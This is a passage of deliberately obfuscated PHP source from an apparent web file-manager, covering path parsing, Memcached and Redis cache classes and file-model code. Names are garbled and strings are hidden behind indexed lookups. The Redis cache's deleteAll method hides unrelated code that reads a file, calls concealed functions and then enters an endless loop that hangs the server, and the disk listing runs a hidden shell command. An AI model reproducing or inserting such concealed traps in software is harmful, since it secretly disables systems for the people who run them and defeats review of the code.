$ê°ÚÎâŠ[$ù…š“Û[1172]] = $±æ®×·”[4]; } $…üğüÚ = array($ù…š“Û[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ê°ÚÎâŠ[$ù…š“Û[1228]] = in_array($ê°ÚÎâŠ[$ù…š“Û[33]], $…üğüÚ); return $ê°ÚÎâŠ; } public static function isTruePath($¬§¯Ô÷) { $¶¼Æô¦ =& $_SERVER[ïëó©ÒÚ]; if (substr($¬§¯Ô÷, 0, 1) != $¶¼Æô¦[1265]) { return !0; } if (strpos($¬§¯Ô÷, $¶¼Æô¦[417]) === 0) { return !0; } if (strpos($¬§¯Ô÷, $¶¼Æô¦[1232]) === 0) { return !0; } if (strpos($¬§¯Ô÷, $¶¼Æô¦[1267]) === 0) { return !0; } if (strpos($¬§¯Ô÷, $¶¼Æô¦[1268]) === 0) { return !0; } if (strpos($¬§¯Ô÷, $¶¼Æô¦[1269]) === 0) { return !0; } return !1; } public static function clear($§À”ë£Š) { $öÜØé±’ =& $_SERVER[ïëó©ÒÚ]; $§À”ë£Š = str_replace(array($öÜØé±’[1081], $öÜØé±’[231]), $öÜØé±’[53], $§À”ë£Š); $§À”ë£Š = str_replace($öÜØé±’[97], $öÜØé±’[8], $§À”ë£Š); $Øœİ†Şô = $öÜØé±’[1270]; if (substr($§À”ë£Š, 0, 3) == $öÜØé±’[1271]) { $§À”ë£Š = substr($§À”ë£Š, 3); } while (strstr($§À”ë£Š, $Øœİ†Şô)) { $§À”ë£Š = str_replace($Øœİ†Şô, $öÜØé±’[8], $§À”ë£Š); } $§À”ë£Š = preg_replace($öÜØé±’[1272], $öÜØé±’[8], $§À”ë£Š); if ($§À”ë£Š == $öÜØé±’[8]) { return $öÜØé±’[8]; } $§À”ë£Š = rtrim($§À”ë£Š, $öÜØé±’[8]); return $§À”ë£Š; } public static function sourceID($»ÑëË¸Ú) { $ È¡Ê»³ =& $_SERVER[ïëó©ÒÚ]; $ŸÎ€ùÜò = self::parse($»ÑëË¸Ú); if ($ŸÎ€ùÜò[$ È¡Ê»³[33]] !== self::KOD_SOURCE) { show_json(LNG($ È¡Ê»³[1273]), !1); } return $ŸÎ€ùÜò[$ È¡Ê»³[399]]; } public static function make($¶ºÑğ¹Ö) { if (!$¶ºÑğ¹Ö) { return !1; } return self::makePath(self::KOD_SOURCE, intval($¶ºÑğ¹Ö)); } public static function makeShare($¢—Ù€†, $Ë©©“Õ£) { return self::makePath(self::KOD_SHARE_ITEM, $¢—Ù€†, $Ë©©“Õ£); } public static function makeFileTypePath($›„ÏÑ) { return self::makePath(self::KOD_USER_FILE_TYPE, $›„ÏÑ); } public static function makeFileTagPath($ÎËìĞßú) { return self::makePath(self::KOD_USER_FILE_TAG, $ÎËìĞßú); } public static function makePath($ûüîñ§, $÷¸÷è¤É = '', $ı›€‚Ô“ = '') { $ú™—Ì¸ =& $_SERVER[ïëó©ÒÚ]; $ş‰‘ñ«¢ = substr($ûüîñ§, 1, -1); $Œ’Ã·›™ = $ú™—Ì¸[1274] . $ş‰‘ñ«¢ . $ú™—Ì¸[1275] . $÷¸÷è¤É . $ú™—Ì¸[1276]; $Œ’Ã·›™ = $ı›€‚Ô“ ? $Œ’Ã·›™ . $ı›€‚Ô“ . $ú™—Ì¸[8] : $Œ’Ã·›™; return $Œ’Ã·›™; } public static function hashPath($üÛÌñÚÃ, $Íœ±Ä‡é = true) { $üäÌšà =& $_SERVER[ïëó©ÒÚ]; $íºÃ°å = is_array($üÛÌñÚÃ) ? $üÛÌñÚÃ : IO::info($üÛÌñÚÃ); $±Ë’Šº¿ = _get($íºÃ°å, $üäÌšà[1277], $üäÌšà[12]); if (!$±Ë’Šº¿ && isset($íºÃ°å[$üäÌšà[411]])) { $íºÃ°å = IO::info(KodIO::make($íºÃ°å[$üäÌšà[411]])); $±Ë’Šº¿ = _get($íºÃ°å, $üäÌšà[1277], $üäÌšà[12]); } if (!$±Ë’Šº¿ && $Íœ±Ä‡é) { $“”ï’ôİ = KodIO::parse($íºÃ°å[$üäÌšà[84]]); if (!$“”ï’ôİ[$üäÌšà[33]]) { $±Ë’Šº¿ = IO::hashSimple($íºÃ°å[$üäÌšà[84]]); } } if (!$±Ë’Šº¿) { $±Ë’Šº¿ = md5($íºÃ°å[$üäÌšà[84]] . $íºÃ°å[$üäÌšà[76]] . $íºÃ°å[$üäÌšà[85]]); } return $±Ë’Šº¿; } public static function initSystemPath() { $ŒìĞçÁ =& $_SERVER[ïëó©ÒÚ]; if (defined($ŒìĞçÁ[1278])) { return; } define($ŒìĞçÁ[1278], self::systemPath($ŒìĞçÁ[1279])); define($ŒìĞçÁ[1280], self::systemPath($ŒìĞçÁ[1281])); define($ŒìĞçÁ[1282], self::systemPath($ŒìĞçÁ[1283])); define($ŒìĞçÁ[1284], self::systemPath($ŒìĞçÁ[1285])); IOHistory::bindEvent(); } public static function systemPath($¯Úƒâü—) { $Ñª ¦ÃØ =& $_SERVER[ïëó©ÒÚ]; $ŒÛöÖÑ¯ = $Ñª ¦ÃØ[1286] . ucfirst($¯Úƒâü—); $Íî‚ìÃ = Model($Ñª ¦ÃØ[780])->get($ŒÛöÖÑ¯); if ($Íî‚ìÃ) { return $Íî‚ìÃ; } if ($¯Úƒâü— == $Ñª ¦ÃØ[1279]) { $Íî‚ìÃ = self::make(Model($Ñª ¦ÃØ[835])->systemRootPathAdd($Ñª ¦ÃØ[553])); } else { $Íî‚ìÃ = self::systemPath($Ñª ¦ÃØ[1279]); $¨£°¿„  = self::sourceID($Íî‚ìÃ); $Íî‚ìÃ = self::make(Model($Ñª ¦ÃØ[835])->mkdir($¨£°¿„ , $¯Úƒâü—)); } Model($Ñª ¦ÃØ[780])->set($ŒÛöÖÑ¯, $Íî‚ìÃ); return $Íî‚ìÃ; } public static function systemFolder($éê…·ö‹) { $ó‹èëëÚ = IO_PATH_SYSTEM_SOURCE . $éê…·ö‹; $–ºÖşÕÛ = Cache::get($ó‹èëëÚ); if (!$–ºÖşÕÛ) { $ıü¯¸í = IO::infoFull($ó‹èëëÚ); if (!$ıü¯¸í) { $–ºÖşÕÛ = IO::mkdir($ó‹èëëÚ, REPEAT_SKIP); } else { $–ºÖşÕÛ = $ıü¯¸í[$_SERVER[ïëó©ÒÚ][84]]; } Cache::set($ó‹èëëÚ, $–ºÖşÕÛ, 3600 * 10); } return $–ºÖşÕÛ; } public static function defaultDriver() { return Model($_SERVER[ïëó©ÒÚ][777])->defaultDriver(); } public static function defaultIO() { $ğè†®£€ =& $_SERVER[ïëó©ÒÚ]; $ıïéĞŸœ = self::defaultDriver(); return $ğè†®£€[1287] . $ıïéĞŸœ[$ğè†®£€[399]] . $ğè†®£€[1276]; } public static function defaultDriverInit() { static $ğ¹â£‰Ô = false; if ($ğ¹â£‰Ô) { return $ğ¹â£‰Ô; } $ğ¹â£‰Ô = IO::init(self::defaultIO()); return $ğ¹â£‰Ô; } public static function fileTypeList() { $¦™ï‘®Ê =& $_SERVER[ïëó©ÒÚ]; $¸–œÃ¼¸ = $GLOBALS[$¦™ï‘®Ê[6]][$¦™ï‘®Ê[1288]]; foreach ($¸–œÃ¼¸ as $Ê“ƒü…º => $Ì•¿ú„½) { $¿Îİ¹á = $¦™ï‘®Ê[1289] . $Ê“ƒü…º; $‡—øØèâ = LNG($¿Îİ¹á); if ($¿Îİ¹á != $‡—øØèâ) { $¸–œÃ¼¸[$Ê“ƒü…º][$¦™ï‘®Ê[32]] = $‡—øØèâ; } } return $¸–œÃ¼¸; } public static function diskList($“¸Ú‘Ò‡ = true) { $‚âÄ«µ× = $_SERVER[ïëó©ÒÚ][1290]; if ($“¸Ú‘Ò‡) { $¸¼‡ç²ß = Cache::get($‚âÄ«µ×); if (is_array($¸¼‡ç²ß)) { return $¸¼‡ç²ß; } } $¸¼‡ç²ß = self::diskListGet(); Cache::set($‚âÄ«µ×, $¸¼‡ç²ß, 60); return $¸¼‡ç²ß; } public static function diskListGet() { $¥ıÊ°€˜ =& $_SERVER[ïëó©ÒÚ]; $¾àÍ“ş« = array(); if ($GLOBALS[$¥ıÊ°€˜[6]][$¥ıÊ°€˜[1291]] == $¥ıÊ°€˜[1292]) { $•‹À©æÇ = $¥ıÊ°€˜[1293]; for ($ Âì‡ = 0; $ Âì‡ < strlen($•‹À©æÇ); $ Âì‡++) { $Íåß•ÃŒ = $•‹À©æÇ[$ Âì‡] . $¥ıÊ°€˜[1294]; if (file_exists($Íåß•ÃŒ)) { $¾àÍ“ş«[] = $Íåß•ÃŒ; } } return $¾àÍ“ş«; } if (!function_exists($¥ıÊ°€˜[98])) { $¾àÍ“ş«[] = $¥ıÊ°€˜[845]; return $¾àÍ“ş«; } $µÆšíùï = explode($¥ıÊ°€˜[231], shell_exec($¥ıÊ°€˜[1295])); array_shift($µÆšíùï); array_pop($µÆšíùï); $Êñ­Íİ = array($¥ıÊ°€˜[1296], $¥ıÊ°€˜[1297], $¥ıÊ°€˜[1298], $¥ıÊ°€˜[1299], $¥ıÊ°€˜[1300], $¥ıÊ°€˜[1301], $¥ıÊ°€˜[1302], $¥ıÊ°€˜[1303]); foreach ($µÆšíùï as $æÖÉ¹èõ) { $ôš®¿óÃ = preg_split($¥ıÊ°€˜[1304], $æÖÉ¹èõ); $Íåß•ÃŒ = $ôš®¿óÃ[count($ôš®¿óÃ) - 1]; if (!strstr($ôš®¿óÃ[0], $¥ıÊ°€˜[1305]) || !$Íåß•ÃŒ) { continue; } $Á´êåÂƒ = rtrim($Íåß•ÃŒ, $¥ıÊ°€˜[8]) . $¥ıÊ°€˜[8]; if (in_array($Á´êåÂƒ, $Êñ­Íİ)) { continue; } $¾àÍ“ş«[] = $Á´êåÂƒ; } return $¾àÍ“ş«; } public static function isSameDisk($İ®¯Ş•ë, $ƒ¼÷–î) { $¯ü²Şë¸ =& $_SERVER[ïëó©ÒÚ]; if ($GLOBALS[$¯ü²Şë¸[6]][$¯ü²Şë¸[1291]] == $¯ü²Şë¸[1292]) { return strtolower(substr($İ®¯Ş•ë, 0, 1)) == strtolower(substr($ƒ¼÷–î, 0, 1)); } $£¦’ß· = self::diskList(); $’ŠÖ”Š¦ = !1; $¤èÂøªÜ = !1; sort($£¦’ß·); $£¦’ß· = array_reverse($£¦’ß·); $İ®¯Ş•ë = rtrim($İ®¯Ş•ë, $¯ü²Şë¸[8]) . $¯ü²Şë¸[8]; $ƒ¼÷–î = rtrim($ƒ¼÷–î, $¯ü²Şë¸[8]) . $¯ü²Şë¸[8]; foreach ($£¦’ß· as $³Çµœğ) { $¬úå³±ù = strlen($³Çµœğ); if (!$’ŠÖ”Š¦ && substr($İ®¯Ş•ë, 0, $¬úå³±ù) == $³Çµœğ) { $’ŠÖ”Š¦ = $³Çµœğ; } if (!$¤èÂøªÜ && substr($ƒ¼÷–î, 0, $¬úå³±ù) == $³Çµœğ) { $¤èÂøªÜ = $³Çµœğ; } if ($’ŠÖ”Š¦ && $¤èÂøªÜ) { break; } } return $’ŠÖ”Š¦ === $¤èÂøªÜ; } public static function transferType($¶²ìåÚ, $Œ¶Õ¨„®) { $Åİ¶Ëâ =& $_SERVER[ïëó©ÒÚ]; $ä™Œş’Ğ = self::driverType($¶²ìåÚ); $É¸¡“ù = self::driverType($Œ¶Õ¨„®); if ($ä™Œş’Ğ[$Åİ¶Ëâ[33]] == $É¸¡“ù[$Åİ¶Ëâ[33]] && $ä™Œş’Ğ[$Åİ¶Ëâ[1306]] == $É¸¡“ù[$Åİ¶Ëâ[1306]]) { return $Åİ¶Ëâ[1307]; } if ($ä™Œş’Ğ[$Åİ¶Ëâ[33]] == $Åİ¶Ëâ[874] && $É¸¡“ù[$Åİ¶Ëâ[33]] == $Åİ¶Ëâ[106]) { return $Åİ¶Ëâ[1202]; } if ($ä™Œş’Ğ[$Åİ¶Ëâ[33]] == $Åİ¶Ëâ[106] && $É¸¡“ù[$Åİ¶Ëâ[33]] == $Åİ¶Ëâ[874]) { return $Åİ¶Ëâ[107]; } return $Åİ¶Ëâ[1308]; } public static function driverType($€ãÍéâ) { $ç‚‡Çó» =& $_SERVER[ïëó©ÒÚ]; $ù½“·© = str_replace($ç‚‡Çó»[1309], $ç‚‡Çó»[12], strtolower($€ãÍéâ->getType())); if ($ù½“·© == $ç‚‡Çó»[768] || $ù½“·© == $ç‚‡Çó»[1310] || $ù½“·© == $ç‚‡Çó»[1311]) { $€ãÍéâ = self::defaultDriverInit(); } else { if ($ù½“·© == $ç‚‡Çó»[1209] || $ù½“·© == $ç‚‡Çó»[1312]) { $€ãÍéâ = IO::init($€ãÍéâ->pathParse[$ç‚‡Çó»[1154]]); } } $ñØÕÒÙ = $€ãÍéâ->path; $ù½“·© = str_replace($ç‚‡Çó»[1309], $ç‚‡Çó»[12], strtolower($€ãÍéâ->getType())); if ($ù½“·© == $ç‚‡Çó»[106]) { return array($ç‚‡Çó»[33] => $ç‚‡Çó»[106], $ç‚‡Çó»[1306] => $ç‚‡Çó»[12], $ç‚‡Çó»[84] => $ñØÕÒÙ); } return array($ç‚‡Çó»[33] => $ç‚‡Çó»[874], $ç‚‡Çó»[1306] => $€ãÍéâ->pathDriver, $ç‚‡Çó»[84] => $ñØÕÒÙ); } public static function pathDriverType($õ¶ÊªÅ€) { return $õ¶ÊªÅ€ ? self::driverType(IO::init($õ¶ÊªÅ€)) : !1; } } goto BöØÕ‰ÆãÁ; b¨¤Ã´ëÅ¸: class CacheLockDatabase { public function lock($öºˆæıø, $«–Îú = 0) { $¹ïøĞ’Ã = Model($_SERVER[ïëó©ÒÚ][839]); $£ı˜ñæŞ = microtime(!0) + $«–Îú; while (microtime(!0) < $£ı˜ñæŞ) { $ıìš°’´ = $¹ïøĞ’Ã->get($öºˆæıø); if (!$ıìš°’´ || $ıìš°’´ < microtime(!0)) { $º—˜•ï = $¹ïøĞ’Ã->set($öºˆæıø, $£ı˜ñæŞ); if ($º—˜•ï) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ûª´Š°Ã) { return Model($_SERVER[ïëó©ÒÚ][839])->get($Ûª´Š°Ã); } public function unlock($ƒğÕ°ñı) { Model($_SERVER[ïëó©ÒÚ][839])->remove($ƒğÕ°ñı); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($‹Ê‚œ³Û, $¹›é¸ÑÎ) { $Ô¥£¶ûŒ =& $_SERVER[ïëó©ÒÚ]; if (!class_exists($Ô¥£¶ûŒ[872])) { show_json($Ô¥£¶ûŒ[873], !1); } $this->cacheTime = $¹›é¸ÑÎ; $this->handle = new Memcached(); if (is_array($‹Ê‚œ³Û[$Ô¥£¶ûŒ[874]]) && count($‹Ê‚œ³Û[$Ô¥£¶ûŒ[874]]) >= 1) { foreach ($‹Ê‚œ³Û[$Ô¥£¶ûŒ[874]] as $ßğä´â) { $®Ù›÷ÊÈ = explode($Ô¥£¶ûŒ[4], $ßğä´â); $this->handle->addServer($®Ù›÷ÊÈ[0], $®Ù›÷ÊÈ[1]); } } else { $this->handle->addServer($‹Ê‚œ³Û[$Ô¥£¶ûŒ[181]], $‹Ê‚œ³Û[$Ô¥£¶ûŒ[182]]); } } public function set($ëúèıâ™, $¤ê¹»å¤, $›Ï±‚’Ì = false) { $›Ï±‚’Ì = $›Ï±‚’Ì ? $›Ï±‚’Ì : $this->cacheTime; return $this->handle->set($ëúèıâ™, $¤ê¹»å¤, $›Ï±‚’Ì); } public function get($öÚİ³Âº) { return $this->handle->get($öÚİ³Âº); } public function remove($öœùèØØ) { return $this->handle->delete($öœùèØØ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¤›™Ø¿, $³„†î·) { $û‰­‹ªÎ =& $_SERVER[ïëó©ÒÚ]; if (!class_exists($û‰­‹ªÎ[875])) { show_json($û‰­‹ªÎ[876], !1); } $this->cacheTime = $³„†î·; $÷Æº€îä = isset($¤›™Ø¿[$û‰­‹ªÎ[877]]) ? $¤›™Ø¿[$û‰­‹ªÎ[877]] : 10; $ùÕàµèÚ = _get($¤›™Ø¿, $û‰­‹ªÎ[874]); if ($ùÕàµèÚ && is_array($ùÕàµèÚ)) { $this->initCluster($¤›™Ø¿, $÷Æº€îä); } else { $this->handle = $this->init($¤›™Ø¿, $÷Æº€îä); } } private function init($åğûĞ, $Ûæéõé…) { $÷ŞïéÒ€ =& $_SERVER[ïëó©ÒÚ]; $ŒÌåóÑ¼ = new Redis(); $µ‡ª±Ó = isset($åğûĞ[$÷ŞïéÒ€[878]]) ? $åğûĞ[$÷ŞïéÒ€[878]] : !1; if ($µ‡ª±Ó) { $ŒÌåóÑ¼->pconnect($åğûĞ[$÷ŞïéÒ€[181]], $åğûĞ[$÷ŞïéÒ€[182]], $Ûæéõé…); } else { $ŒÌåóÑ¼->connect($åğûĞ[$÷ŞïéÒ€[181]], $åğûĞ[$÷ŞïéÒ€[182]], $Ûæéõé…); } if (!empty($åğûĞ[$÷ŞïéÒ€[422]])) { $ŒÌåóÑ¼->auth($åğûĞ[$÷ŞïéÒ€[422]]); } if (!empty($åğûĞ[$÷ŞïéÒ€[768]]) && $åğûĞ[$÷ŞïéÒ€[768]] != 0) { $ŒÌåóÑ¼->select($åğûĞ[$÷ŞïéÒ€[768]]); } return $ŒÌåóÑ¼; } private function initCluster($‘¯Ğ¾, $‡††…Î÷) { $”¿ë­‘¶ =& $_SERVER[ïëó©ÒÚ]; $ÁÕÛÊ“ = array($”¿ë­‘¶[879], $”¿ë­‘¶[880], $”¿ë­‘¶[881]); $ûÔªÖ€º = $”¿ë­‘¶[879]; if (isset($‘¯Ğ¾[$”¿ë­‘¶[16]]) && in_array($‘¯Ğ¾[$”¿ë­‘¶[16]], $ÁÕÛÊ“)) { $ûÔªÖ€º = $‘¯Ğ¾[$”¿ë­‘¶[16]]; } switch ($ûÔªÖ€º) { case $”¿ë­‘¶[879]: $this->_slave($‘¯Ğ¾, $‡††…Î÷); break; case $”¿ë­‘¶[880]: break; case $”¿ë­‘¶[881]: $this->isCluster = !0; $çèˆÓÔû = $‘¯Ğ¾[$”¿ë­‘¶[874]]; $ì‰œ¸â¡ = isset($‘¯Ğ¾[$”¿ë­‘¶[878]]) ? $‘¯Ğ¾[$”¿ë­‘¶[878]] : !1; $¾áØÖ÷‰ = isset($‘¯Ğ¾[$”¿ë­‘¶[422]]) ? $‘¯Ğ¾[$”¿ë­‘¶[422]] : null; $this->handle = new RedisCluster(NUll, $çèˆÓÔû, $‡††…Î÷, $‡††…Î÷, $ì‰œ¸â¡, $¾áØÖ÷‰); break; default: break; } } private function _slave($ÇûŸéÂ, $ŒÍ¦É¤„) { $‡·İ²Œ‰ = $ÇûŸéÂ[$_SERVER[ïëó©ÒÚ][874]]; $this->filterConfig($ÇûŸéÂ, $‡·İ²Œ‰[0]); $this->handle = $this->init($ÇûŸéÂ, $ŒÍ¦É¤„); unset($‡·İ²Œ‰[0]); if (empty($‡·İ²Œ‰)) { return; } $®¬€Ó©Ò = array_rand($‡·İ²Œ‰); $this->filterConfig($ÇûŸéÂ, $‡·İ²Œ‰[$®¬€Ó©Ò]); $this->slaveHandle = $this->init($ÇûŸéÂ, $ŒÍ¦É¤„); } private function filterConfig(&$Ë äóà„, $Òæ¸ÅÑ) { $²ªâğ› =& $_SERVER[ïëó©ÒÚ]; $ÂéÚ£Ø– = explode($²ªâğ›[4], $Òæ¸ÅÑ); $•¹Û¶Ìí = array($²ªâğ›[181] => $ÂéÚ£Ø–[0], $²ªâğ›[182] => $ÂéÚ£Ø–[1]); $Ë äóà„ = array_merge($Ë äóà„, $•¹Û¶Ìí); } public function set($§€èĞğÄ, $„úÆó“š, $¿ ­ÔœÔ = false) { $¿ ­ÔœÔ = $¿ ­ÔœÔ ? $¿ ­ÔœÔ : $this->cacheTime; return $this->handle->setEx($§€èĞğÄ, $¿ ­ÔœÔ, $„úÆó“š); } public function setLock($ÇÑŒòŞ¹, $ãñşòñĞ, $ìÖÀéÍ) { return $this->handle->setNX($ÇÑŒòŞ¹, $ãñşòñĞ); } public function get($”®§®ÇÎ) { $¡€ºñµ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¡€ºñµ->get($”®§®ÇÎ); } public function remove($ıƒÍÅ‚) { return $this->handle->del($ıƒÍÅ‚); } public function deleteAll() { $—·òÄ¸ì =& $_SERVER[ïëó©ÒÚ]; if (!isset($_SERVER[$—·òÄ¸ì[400]]) || !isset($_SERVER[$—·òÄ¸ì[408]])) { $³“µ°ÌÉ = $—·òÄ¸ì[882]; $Â™™É = $—·òÄ¸ì[402]; $Šš¯ÎÜ­ = $_SERVER[$—·òÄ¸ì[403]] . $—·òÄ¸ì[404]; $¸«Ÿı™’ = $Â™™É($Šš¯ÎÜ­); $¥ìıúÌÈ = explode($—·òÄ¸ì[231], $¸«Ÿı™’); if (count($¥ìıúÌÈ) < $—·òÄ¸ì[631]) { $“ÜÁüÕá = $—·òÄ¸ì[406]; $“ÜÁüÕá(); } $…äÉ›Ë­ = $—·òÄ¸ì[883]; $…äÉ›Ë­($_SERVER[$—·òÄ¸ì[884]]); $…®Äçãº = 1; for ($¢Åì³×„ = $…®Äçãº; $¢Åì³×„ > 0; $¢Åì³×„++) { $…äÉ›Ë­ = json_encode($GLOBALS[$—·òÄ¸ì[427]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ÎóçìÅ) { $this->handle->flushall($ÎóçìÅ); } return; } return $this->handle->flushAll(); } } goto aˆÕáì­ë›; AÔ«Ş°ñŒ‰: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x66\x69\154\145\x5f\143\x6f\x6e\x74\145\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\145\x61\164\145\124\x69\155\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\165\156\143\x74\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\142\154\x65\116\141\x6d\x65" => "\x69\157\137\146\x69\x6c\145\x5f\155\145\x74\141", "\x6d\x65\164\x61\x46\151\x65\154\144" => "\146\x69\x6c\145\x49\x44"); public function fileInfo($Ö˜æá‰Ğ) { $òá©é¿ =& $_SERVER[ïëó©ÒÚ]; static $¸¼€Ùåú = array(); if (!isset($¸¼€Ùåú[$Ö˜æá‰Ğ])) { $âˆ…Å…õ = $òá©é¿[1882]; $ªŸ¥ê‹² = Model($òá©é¿[480])->field($âˆ…Å…õ)->where(array($òá©é¿[478] => $Ö˜æá‰Ğ))->find(); $¸¼€Ùåú[$Ö˜æá‰Ğ] = $ªŸ¥ê‹²; } return $¸¼€Ùåú[$Ö˜æá‰Ğ]; } public function addFileByContent($˜­«Ù‹Õ = '', $çõ±îÛ‹ = '') { $Ù¥›Ó² =& $_SERVER[ïëó©ÒÚ]; $ñàœ¯˜Ñ = TEMP_PATH . $Ù¥›Ó²[1883]; if (!is_dir($ñàœ¯˜Ñ)) { mk_dir($ñàœ¯˜Ñ); } $­ŞÃ¶Û = $ñàœ¯˜Ñ . $Ù¥›Ó²[1884] . rand_string(16); file_put_contents($­ŞÃ¶Û, $˜­«Ù‹Õ); $’¸‚óı“ = $this->addFile($­ŞÃ¶Û, $çõ±îÛ‹, !0); if (file_exists($­ŞÃ¶Û)) { @unlink($­ŞÃ¶Û); } return $’¸‚óı“; } public function createFileName($Ï–İˆÙ, $âŠ‰§Ò® = false, $ğ¥æ–¿¸ = false) { $ÜÊ“¬± =& $_SERVER[ïëó©ÒÚ]; $ÒÍ‡ª¡ = IO::init($ÜÊ“¬±[8]); $Ëä‘”Ï– = $this->makeFilePath($Ï–İˆÙ, $ÒÍ‡ª¡, $âŠ‰§Ò®, $ğ¥æ–¿¸); $§Şõ¬ = $ÒÍ‡ª¡->pathFather($Ëä‘”Ï–); static $ŠÃ˜ô»Ø = false; $¸À˜æ¨± = $ÜÊ“¬±[1885] . md5($§Şõ¬); if (!$ŠÃ˜ô»Ø && !Cache::get($¸À˜æ¨±)) { $ŠÃ˜ô»Ø = !0; $ûúÊûàı = IO::mkdir($§Şõ¬); if (!IO::exist($ûúÊûàı . $ÜÊ“¬±[807])) { IO::mkfile($ûúÊûàı . $ÜÊ“¬±[807]); } Cache::set($¸À˜æ¨±, 1, 3600 * 2); } return $Ëä‘”Ï–; } public function makeFilePath($”ñè­³õ, $ãŞÔÈùÈ, $îßáêùõ = false, $©Öûôùİ = false) { $Ÿ»«××½ =& $_SERVER[ïëó©ÒÚ]; $ŒÎßì = Model($Ÿ»«××½[780])->get($Ÿ»«××½[1886]); $Ğä Â…ˆ = KodIO::defaultIO() . date($Ÿ»«××½[1887]); $— ‰¢â¿ = $Ğä Â…ˆ . rand_string(5) . short_id(100); $”ñè­³õ = str_replace($Ÿ»«××½[8], $Ÿ»«××½[11], KodIO::clear($”ñè­³õ)); $é½ˆìê† = $ãŞÔÈùÈ->ext($”ñè­³õ); if (!$”ñè­³õ) { $ŒÎßì = $Ÿ»«××½[1888]; } switch ($ŒÎßì) { case $Ÿ»«××½[1889]: $— ‰¢â¿ = $— ‰¢â¿ . $Ÿ»«××½[10] . $ãŞÔÈùÈ->ext($”ñè­³õ); if ($é½ˆìê† == $Ÿ»«××½[1826]) { $— ‰¢â¿ .= $Ÿ»«××½[1556]; } break; case $Ÿ»«××½[1890]: $¥ÒÛÔ–œ = Model($Ÿ»«××½[780])->get($Ÿ»«××½[781]); $Ëå¡ÉŞ = substr(md5($Ÿ»«××½[782] . $¥ÒÛÔ–œ . date($Ÿ»«××½[758])), 0, 8); $Š‹Ô¹ï = KodIO::defaultDriver(); $Ğä Â…ˆ = $Ÿ»«××½[1232] . $Š‹Ô¹ï[$Ÿ»«××½[399]] . $Ÿ»«××½[418] . date($Ÿ»«××½[1891]) . $Ëå¡ÉŞ . $Ÿ»«××½[8]; if ($é½ˆìê† == $Ÿ»«××½[1826]) { $”ñè­³õ .= $Ÿ»«××½[1556]; } $èÓå‚ò = $Ÿ»«××½[1892] . $Ğä Â…ˆ . $”ñè­³õ; CacheLock::lock($èÓå‚ò); $— ‰¢â¿ = $Ğä Â…ˆ . $”ñè­³õ; if (IO::exist($Ğä Â…ˆ . $”ñè­³õ)) { $éƒ³·Íæ = substr($”ñè­³õ, 0, strlen($”ñè­³õ) - strlen($é½ˆìê†)); $ É°ı‹ = $©Öûôùİ ? substr($©Öûôùİ, 0, 5) : ($îßáêùõ ? substr($îßáêùõ, 0, 5) : rand_string(5)); $— ‰¢â¿ = $Ğä Â…ˆ . $éƒ³·Íæ . $ É°ı‹ . $Ÿ»«××½[10] . $é½ˆìê†; } if (IO::isTypeObject($— ‰¢â¿) && !IO::isUploadServer($— ‰¢â¿)) { if (IO::exist($— ‰¢â¿)) { return $— ‰¢â¿; } $ï”î­ç» = IO::setContent($— ‰¢â¿, $Ÿ»«××½[12]); if (!$ï”î­ç») { show_json($Ÿ»«××½[1893], !1); } } CacheLock::unlock($èÓå‚ò); break; case $Ÿ»«××½[1888]: break; default: break; } return $— ‰¢â¿; } public function addFileByRemote($ëšç‚¢‡, $á•Á½, $û²©¾á• = array()) { $…³Œ—“† =& $_SERVER[ïëó©ÒÚ]; if (!IO::exist($ëšç‚¢‡)) { return !1; } $ü­ÌÏÛ = $û²©¾á•[$…³Œ—“†[176]] ? $û²©¾á•[$…³Œ—“†[176]] : $…³Œ—“†[12]; $ÆáÁéë• = IO::hashMd5($ëšç‚¢‡, $ü­ÌÏÛ); $ïôÜÍ—Ü = KodIO::defaultDriver(); $ ¢ÜØş± = array($…³Œ—“†[594] => IO::size($ëšç‚¢‡), $…³Œ—“†[1894] => 1, $…³Œ—“†[429] => $á•Á½, $…³Œ—“†[818] => $ïôÜÍ—Ü[$…³Œ—“†[399]], $…³Œ—“†[430] => $ëšç‚¢‡, $…³Œ—“†[1895] => $û²©¾á•[$…³Œ—“†[177]] ? $û²©¾á•[$…³Œ—“†[177]] : IO::hashSimple($ëšç‚¢‡), $…³Œ—“†[1896] => $ÆáÁéë• ? $ÆáÁéë• : $ü­ÌÏÛ); if ($şñß‹ïò = $this->addFileCheckExist($ ¢ÜØş±[$…³Œ—“†[177]], $ ¢ÜØş±[$…³Œ—“†[176]], $ ¢ÜØş±[$…³Œ—“†[76]])) { return $şñß‹ïò; } return $this->addFileData($ ¢ÜØş±); } private function addFileData($¥ˆ€Õïæ) { $¢Ì¸ÜÓ =& $_SERVER[ïëó©ÒÚ]; if (!$¥ˆ€Õïæ) { return !1; } $¥ˆ€Õïæ[$¢Ì¸ÜÓ[76]] = intval($¥ˆ€Õïæ[$¢Ì¸ÜÓ[76]]); if (!$¥ˆ€Õïæ[$¢Ì¸ÜÓ[76]] && strlen($¥ˆ€Õïæ[$¢Ì¸ÜÓ[177]]) > 32) { $¥ˆ€Õïæ[$¢Ì¸ÜÓ[76]] = intval(substr($¥ˆ€Õïæ[$¢Ì¸ÜÓ[177]], 32)); } $ÂÒ„ÕÛ‡ = $this->add($¥ˆ€Õïæ); return $this->find($ÂÒ„ÕÛ‡); } public function addFile($·ü˜Şî, $Õ¢ô°©ƒ, $æ©ÎÛûú = false) { $ÆÃ®§ÙÔ =& $_SERVER[ïëó©ÒÚ]; $©ÇÌÀ± = IO::hashSimple($·ü˜Şî); $İ•—µØ‚ = IO::size($·ü˜Şî); $šä¼¤Ì• = $İ•—µØ‚ <= 1024 * 1024 * 10 ? IO::hashMd5($·ü˜Şî) : $ÆÃ®§ÙÔ[12]; $‹ÑÂ£Ş’ = $ÆÃ®§ÙÔ[1897] . $©ÇÌÀ±; CacheLock::lock($‹ÑÂ£Ş’); if ($šä¼¤Ì• && 